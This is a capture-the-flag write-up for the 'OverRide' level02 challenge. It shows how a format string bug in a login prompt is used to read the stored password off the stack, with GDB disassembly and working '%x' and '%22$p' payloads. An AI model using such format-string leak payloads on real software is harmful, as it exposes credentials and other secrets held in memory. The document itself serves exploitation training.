# Analysis and Exploitation of the Program

This program asks for two inputs: a username and a password. These inputs are processed using `fgets` and are stored in memory buffers. At the end of execution, the username buffer is directly passed as a formatting argument to `printf`. This opens the door to a **format string exploit**.

When disassembling the `main` function in GDB, we observe some interesting details:

```
0x000000000040082c <+24>: lea    -0x70(%rbp),%rdx  
0x0000000000400849 <+53>: lea    -0xa0(%rbp),%rdx  
0x0000000000400869 <+85>: lea    -0x110(%rbp),%rdx 
```

These three `LEA` (Load Effective Address) instructions calculate memory addresses and load them into registers. They correspond to the following buffers in the source code:

```c
void var_78;
*__builtin_memset(&var_78, 0, 0x60) = 0;  // User buffer (username)
void var_a8;
*__builtin_memset(&var_a8, 0, 0x28) = 0;  // Password buffer (actual password)
void var_118;
*__builtin_memset(&var_118, 0, 0x60) = 0; // Buffer for entered password
```

Note that:
- **0x70 = 112**, the buffer for the username.
- **0xa0 = 160**, the buffer for the actual password.
- **0x110 = 272**, the buffer for the entered password.

---

## Step 1: Finding the Offset

To begin, we test specific strings to understand how our input interacts with memory and to identify where our input (`AAAA`) appears in the stack.

For example:

```bash
level02@OverRide:~$ ./level02 
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: AAAA %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x
--[ Password: *****************************************
AAAA ffffe3d0 0 78 2a2a2a2a 2a2a2a2a ffffe5c8 f7ff9a08 78252078 25207825 20782520 78252078 25207825 20782520 78252078 25207825 20782520 78252078 25207825 20782520 252078 0 34376848 61733951 574e6758 6e475873 664b394d 0 41414141 25207825 20782520 78252078  does not have access!
```

In this output, `0x41414141` corresponds to the ASCII values of `AAAA`, indicating that our buffer is located at **offset 28** on the stack.

---

## Step 2: Locating the Password Buffer

Between the username buffer and the actual password buffer, there is a gap of 160 (0xa0) - 112 (0x70) = 48 bytes

Since `printf` processes the stack in **blocks of 8 bytes** (the size of a pointer in x86_64 architecture), 48 / 8 = 6 octets

Therefore, we need to adjust our reading offset from `28` down by `6`, which gives us: 28 - 6 = 22

The password buffer starts at **offset 22** on the stack.

---

## Step 3: Reading the Password Content

To read the 5 blocks that make up the password, we use a sequence of offsets in our format string:

```bash
level02@OverRide:~$ ./level02 
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: %22$p %23$p %24$p %25$p %26$p
--[ Password: 
*****************************************
0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d does not have access!
level02@OverRide:~$ 
```

Running the program with this format string gives us the following output:

```
0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d does not have access!
```

These hexadecimal values represent the 5 blocks of the password stored in memory.

By translate them into ASCII and reverse themselves (little endians implies) we got the flag